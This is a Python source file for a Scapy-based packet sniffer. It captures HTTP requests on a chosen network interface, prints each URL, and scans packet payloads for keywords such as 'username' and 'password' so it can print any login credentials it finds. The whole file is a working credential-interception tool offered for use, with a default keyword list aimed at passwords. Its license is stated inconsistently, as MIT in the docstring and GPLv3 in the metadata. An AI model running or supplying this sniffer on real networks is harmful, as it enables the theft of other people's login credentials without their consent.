#!/usr/bin/env python

import argparse
import scapy.all as scapy
from scapy.layers import http

"""
    Run the script by providing the required arguments in the following format:
    
    Usage:
      ./python script.py --interface eth0
        
    To use custom keywords:
      ./python packet_sniffer.py --interface eth0 --keywords myuser mypass
        
    To use a file containing keywords (one per line):
      ./python packet_sniffer.py --interface eth0 --file keywords.txt
      
    A packet sniffer Python script which captures and analyzes network traffic, 
    allowing to inspect data packets being transmitted over a network.
    
    License:
        MIT License

        Copyright (c) 2023, WildBerry, LLC

        Permission is hereby granted, free of charge, to any person obtaining a copy
        of this software and associated documentation files (the "Software"), to deal
        in the Software without restriction, including without limitation the rights
        to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
        copies of the Software, and to permit persons to whom the Software is
        furnished to do so, subject to the following conditions:

        The above copyright notice and this permission notice shall be included in all
        copies or substantial portions of the Software.

        THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
        IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
        FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
        AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
        LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
        OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
        SOFTWARE.
"""

__author__      = "Marco A. Villarruel"
__authors__     = ["Marco A. Villarruel"]
__contacts__    = ["marco.urquieta@proton.me", "marco@wildberry.us"]
__copyright__   = "Copyright 2023, WildBerry, LLC"
__credits__     = ["Marco A. Villarruel"]
__date__        = "2023/06/15"
__deprecated__  = False
__emails__      = ["marco.urquieta@proton.me", "marco@wildberry.us"]
__license__     = "GPLv3"
__maintainer__  = "developer"
__status__      = "Production"
__version__     = "1.0.0"

def logo():
    print("""
        ___    __    __   __  ____  ____  ___   __   _
       / __)  /__\  (  \_/  )(  _ \( ___)/ _ \ (  \_( )
      ( (__  /(__)\ )  ___  ( )___/ )__)( (_) )) (\ ) (
       \___)(__)(__)(__) (__)(__)  (____)\___/ (_) \__)
 _    _  _____  _     ____   _____  ____  _____  _____  _   _
( )  ( )(__ __)( )   (  _ \ ( (_) \( ___)( (_) )( (_) )( )_( )  
) (/\) ( _( )_ ) (__ ) (_) ))  _  ( )__) ) (\ ( ) (\ (  \   /
(_/  \_)(_____)(____)(____/ (_(_)_/(____)(_) \_)(_) \_)  (_)
        """)

# Default keywords for searching login info
DEFAULT_KEYWORDS = ['username', 'user', 'login', 'password', 'pass']


def get_args():
    '''
    Gets the arguments from the command line.
    '''
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", required=True,
                        help="Specify an interface to capture packets.")
    parser.add_argument("-k", "--keywords", dest="keywords", nargs='+',
                        help="Specify keywords to search for in packet load. Separated by spaces.")
    parser.add_argument("-f", "--file", dest="file",
                        help="Specify a file containing keywords to search for in packet load.")
    options = parser.parse_args()

    # Use default keywords if none are specified
    if options.keywords is None and options.file is None:
        options.keywords = DEFAULT_KEYWORDS
    elif options.file is not None:
        with open(options.file, 'r') as f:
            options.keywords = [word.strip() for word in f.readlines()]

    return options


def sniff(interface):
    '''
    Start sniffing on the given interface, processing each sniffed packet.
    '''
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    '''
    Extract URL from the HTTP packet.
    '''
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet, keywords):
    '''
    Attempt to extract login information from packet load using given keywords.
    '''
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        if type(load) == bytes:
            load = load.decode('UTF8', 'replace')

        for keyword in keywords:
            if keyword in load:
                return load

    return None


def process_sniffed_packet(packet):
    '''
    Process a packet, extracting and printing URL and possible login info if found.
    '''
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        if type(url) == bytes:
            url = url.decode('UTF8', 'replace')
        print('[+] HTTP Request >>> ' + url)

        login_info = get_login_info(packet, options.keywords)
        if login_info:
            print('\n\n[+] Possible username/password >>> ' +
                  login_info + '\n\n')


if __name__ == "__main__":
    logo()
    options = get_args()
    sniff(options.interface)
